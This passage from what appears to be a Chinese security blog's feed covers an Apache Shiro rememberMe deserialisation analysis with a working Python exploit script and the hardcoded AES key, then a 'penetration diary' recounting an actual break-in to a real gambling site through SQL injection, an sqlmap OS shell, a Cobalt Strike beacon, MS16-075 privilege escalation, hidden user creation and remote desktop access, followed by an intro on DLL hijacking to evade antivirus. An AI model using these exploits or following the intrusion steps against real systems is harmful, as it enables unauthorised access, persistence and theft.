&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来分析跟进一下<br>首先是在<code>onSuccessfulLogin</code>函数中<code>forgetIdentity(subject);</code>，清除了认证信息，然后通过<code>isRememberMe</code><br>先来跟进该函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isRememberMe</span><span class="hljs-params">(AuthenticationToken token)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> token != <span class="hljs-keyword">null</span> &amp;&amp; (token insta    nceof RememberMeAuthenticationToken) &amp;&amp;<br>            ((RememberMeAuthenticationToken) token).isRememberMe();<br>&#125;<br></code></pre></td></tr></table></figure><p>就是个通过RememberMe来判断是否有认证信息的函数，没什么东西，那回来往下看<br>接着就是这个东西，我们继续跟进<code>rememberIdentity(subject, token, info);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberIdentity</span><span class="hljs-params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> </span>&#123;<br>        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);<br>        rememberIdentity(subject, principals);<br>    &#125;<br></code></pre></td></tr></table></figure><p>首先调用了<code>getIdentityToRemember</code>函数，用来判断是获取用户身份<br>接着跟进<code>rememberIdentity</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberIdentity</span><span class="hljs-params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;<br>    <span class="hljs-keyword">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);<br>    rememberSerializedIdentity(subject, bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>看函数名<code>convertPrincipalsToBytes</code>应该是把<code>accountPrincipals</code>转换为了Byte类型，也可以跟进看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;<br>    <span class="hljs-keyword">byte</span>[] bytes = serialize(principals);<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-keyword">null</span>) &#123;<br>        bytes = encrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里居然藏了一个序列化，还有加密，我们跟进这个加密看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] encrypt(<span class="hljs-keyword">byte</span>[] serialized) &#123;<br>    <span class="hljs-keyword">byte</span>[] value = serialized;<br>    CipherService cipherService = getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());<br>        value = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/HgeLRnpxDYit7hs.png"><br>在debug中可以看到，这里是用到了CBC模式，对序列化后的用户root进行的AES加密，通过<code>getEncryptionCipherKey</code>来获取密钥信息，继续跟进这个函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getEncryptionCipherKey() &#123;<br>    <span class="hljs-keyword">return</span> encryptionCipherKey;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，这里是返回的固定常量<br><code>private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</code><br><img src="https://s2.loli.net/2023/01/04/oBtaZEwTKyOVIec.png"><br>也可以很明显的看到，改密钥也是唯一使用的常量密钥</p><p>清楚这一点之后我们再回到<code>rememberIdentity</code>函数中的<code>rememberSerializedIdentity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberSerializedIdentity</span><span class="hljs-params">(Subject subject, <span class="hljs-keyword">byte</span>[] serialized)</span> </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subject)) &#123;<br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                String msg = <span class="hljs-string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +<br>                        <span class="hljs-string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +<br>                        <span class="hljs-string">&quot;ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br><br>        HttpServletRequest request = WebUtils.getHttpRequest(subject);<br>        HttpServletResponse response = WebUtils.getHttpResponse(subject);<br><br>        <span class="hljs-comment">//base 64 encode it and store as a cookie:</span><br>        String base64 = Base64.encodeToString(serialized);<br><br>        Cookie template = getCookie(); <span class="hljs-comment">//the class attribute is really a template for the outgoing cookies</span><br>        Cookie cookie = <span class="hljs-keyword">new</span> SimpleCookie(template);<br>        cookie.setValue(base64);<br>        cookie.saveTo(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里的主要过程就是个base64编码，然后放到cookie里面</p><p>这里整个存入的流程就就结束了，还是十分好理解且逻辑清晰的</p><blockquote><p>序列化—&gt;AES加密—&gt;base64编码—&gt;设置到cookie中的rememberme字段</p></blockquote><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>解密过程的分析，我们首先找到收到认证时的地方</p><blockquote><p>core/src/main/java/org.apache.shiro/mgt/DefaultSecurityManager</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">getRememberedIdentity</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>&#123;<br>        RememberMeManager rmm = getRememberMeManager();<br>        <span class="hljs-keyword">if</span> (rmm != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">return</span> rmm.getRememberedPrincipals(subjectContext);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">if</span> (log.isWarnEnabled()) &#123;<br>                    String msg = <span class="hljs-string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +<br>                            <span class="hljs-string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;<br>                    log.warn(msg, e);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接着我们还是来逐步分析，最开始是<code>getRememberMeManager</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> RememberMeManager <span class="hljs-title">getRememberMeManager</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> rememberMeManager;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单的获取用户信息<br>接着就是<code>getRememberedPrincipals</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>&#123;<br>    PrincipalCollection principals = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        <span class="hljs-comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br>        <span class="hljs-keyword">if</span> (bytes != <span class="hljs-keyword">null</span> &amp;&amp; bytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException re) &#123;<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> principals;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用的函数有点多，我们一个一个来看,首先是<code>getRememberedSerializedIdentity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                String msg = <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                        <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                        <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        WebSubjectContext wsc = (WebSubjectContext) subjectContext;<br>        <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        HttpServletRequest request = WebUtils.getHttpRequest(wsc);<br>        HttpServletResponse response = WebUtils.getHttpResponse(wsc);<br><br>        String base64 = getCookie().readValue(request, response);<br>        <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>        <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>        <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (base64 != <span class="hljs-keyword">null</span>) &#123;<br>            base64 = ensurePadding(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">byte</span>[] decoded = Base64.decode(base64);<br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-keyword">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> decoded;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//no cookie set - new site visitor?</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>首先是<code>getCookie().readValue</code>读取cookie，再通过<code>ensurePadding</code>函数进行base64的解码<br>然后进到<code>convertBytesToPrincipals</code>函数，继续跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-keyword">null</span>) &#123;<br>        bytes = decrypt(bytes);<br>    &#125;<br>    <span class="hljs-keyword">return</span> deserialize(bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>实现了一个解密，然后反序列化，而这个decrypt肯定与前面的加密对称，为CBC模式的AES<br>那整个的读取流程也结束了</p><blockquote><p>读取cookie中的rememberMe—&gt;base64解码—&gt;AES解密—&gt;反序列化</p></blockquote><h1 id="POC-EXP"><a href="#POC-EXP" class="headerlink" title="POC EXP"></a>POC EXP</h1><p>根据apache的版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以EXP可以直接使用CommonsCollections2的链子，利用ysoserial生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    <span class="hljs-comment"># 这里使用CommonsCollections2模块</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)<br><br>    <span class="hljs-comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span><br>    BS = AES.block_size<br><br>    <span class="hljs-comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span><br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br><br>    <span class="hljs-comment"># 泄露的key</span><br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><br>    <span class="hljs-comment"># AES的CBC加密模式</span><br>    mode = AES.MODE_CBC<br><br>    <span class="hljs-comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br><br>    <span class="hljs-comment"># 实例化一个加密方式为上述的对象</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br><br>    <span class="hljs-comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span><br>    file_body = pad(popen.stdout.read())<br><br>    <span class="hljs-comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span><br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br><br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dnslog</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># cc2的exp</span><br>    payload = encode_rememberme(<span class="hljs-string">&#x27;C:\\WINDOWS\\System32\\calc.exe&#x27;</span>)<br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br><br>    <span class="hljs-comment"># dnslog的poc</span><br>    payload1 = encode_rememberme(<span class="hljs-string">&#x27;https://glacierrrr.online&#x27;</span>)<br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload1.decode()))<br><br>    cookie = &#123;<br>        <span class="hljs-string">&quot;rememberMe&quot;</span>: payload.decode()<br>    &#125;<br><br>    requests.get(url=<span class="hljs-string">&quot;http://127.0.0.1:8080/web_war/&quot;</span>, cookies=cookie)<br></code></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这里可以直接用vulhub更快的搭建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /vulhub/shiro/CVE-2016-4437<br>docker-compose build <br>docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/CuxULEhsrSj5wIa.png"><br>搭建好后，8080端口就可以看到shiro框架的登录界面了</p><h2 id="判断shiro"><a href="#判断shiro" class="headerlink" title="判断shiro"></a>判断shiro</h2><p>我们先用burp suite抓个包看一下<br><img src="https://s2.loli.net/2023/01/04/ANtBJlzRTguFnOp.png"><br>接着我们在报文头中加入<code>Cookie: rememberMe=123;</code><br><img src="https://s2.loli.net/2023/01/04/DgABhVidkIZUe8p.png"><br>再返回的报文中，也可以清楚的看到<code>rememberMe=deleteMe</code><br>这个就是判断shiro框架的信息<br>或者使用bp的插件BurpShiroPassiveScan<br><img src="https://s2.loli.net/2023/01/04/yzoGSnuJLr2EWXc.png"><br>这样bp会自动检测，并直接爆出shiro的漏洞</p><h2 id="利用shiro"><a href="#利用shiro" class="headerlink" title="利用shiro"></a>利用shiro</h2><p>可以使用我们上面给出的exp，利用ysoserial直接打</p><p>或者直接使用集成化较高的工具，扫描并利用<br><img src="https://s2.loli.net/2023/01/04/EsX8jOvBxM3Qgad.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透日记1</title>
      <link href="2022/12/31/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B01/"/>
      <url>2022/12/31/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>渗透小计：碰到一个赌博网站，通过sql注入成功上线，记录一下渗透过程</p><a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote><p>别忘记挂代理<br>先把网址放上来<code>aHR0cDovL3d3dy40MjAyMjIubmV0Lw==</code><br>我们把这个url拿到奇安信威胁研判中心去看一下<br><a href="https://ti.qianxin.com/v2/search?type=domain&value=www.420222.net">奇安信威胁情报中心</a><br>拿到其真实IP<br><img src="https://s2.loli.net/2022/12/31/b8drCavs5kyXoYi.png"><br>直接访问这个ip看一下是啥<br><img src="https://s2.loli.net/2022/12/31/gl3idPbAUkrfL74.png"><br>发现直接404了，那我们拿去用nmap端口扫描一下，也可以用fofa去查一下</p></blockquote><p>这里我用fofa直接扫到一个端口8099是后台登陆<br><img src="https://s2.loli.net/2022/12/31/mywZiORKlIuVE7J.png"></p><p>访问进入其后台登录界面<br><img src="https://s2.loli.net/2022/12/31/6oigYVWBOR8NC1w.png"></p><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p>我们用bp先抓个包看一下<br><img src="https://s2.loli.net/2022/12/31/JjBMXFwiWxDYSPv.png"><br>可以看到，这个流量十分的干净，没有多余的data，并且是直接明文传输的POST<br>到这里，我们第一个想到的肯定就是sql注入尝试一下</p><blockquote><p>这里用到一个小技巧，在需要尝试注入的地方加上<code>*</code>，并删去非注入点的<code>*</code>，传给sqlmap，能更好的注入<br><img src="https://s2.loli.net/2022/12/31/5Pw4VcCogFXyBfa.png"></p></blockquote><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>直接上sqlmap看一下，有没有可以注入的点<br><img src="https://s2.loli.net/2022/12/31/w6aOMXFRnEsyGxS.png"></p><p>可以看到sqlmap的回显,这里是有注入点的<br><code>Title: Microsoft SQL Server/Sybase stacked queries (comment)</code><br><code>Payload: userName=&#39;;WAITFOR DELAY &#39;0:0:10&#39;--1&amp;password=1</code><br>也可以看到数据库的类型，是mssql，由此可以想到，我们需要判断是否为dba用户（dba用户就是sql数据库的管理员）<br><code>--is-dba</code><br>得到sqlmap的回显，确定了是dba用户<br><img src="https://s2.loli.net/2022/12/31/AE5fzRG1SjJ9us2.png"></p><p>由于是mssql，与mysql不一样，可以直接使用<code>--os-shell</code>连接，不需要上传文件找路径等一些麻烦操作</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/307345176">–os-shell原理</a><br>成功连上shell之后，用cs生成一个powershell command的payload，直接执行</p></blockquote><p>成功上线！<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png"><br>通过我们在fofa查到的版本信息，我们直接用<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">ms16-075</a>来打</p><p>成功提权！<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png"><br>接下来就是创建隐藏用户等等操作，这里直接用cs的脚本插件，一键直接创建</p><p>这里就不放图了，提权成功一把梭<br>最后成功连接远程3389桌面！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dll劫持_白加黑</title>
      <link href="2022/12/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/"/>
      <url>2022/12/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/</url>
      
        <content type="html"><![CDATA[<p>DLL劫持可以用作权限维持，权限提升等作用，下面介绍一下在有杀毒软件的情况下dll劫持通过白加黑的方式获取权限，上线目标。<br>杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而上线目标</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike上线过程与蓝队反制</title>
      <link href="2022/11/28/Cobaltstrike%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%E4%B8%8E%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6/"/>
      <url>2022/11/28/Cobaltstrike%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%E4%B8%8E%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6/</url>
      
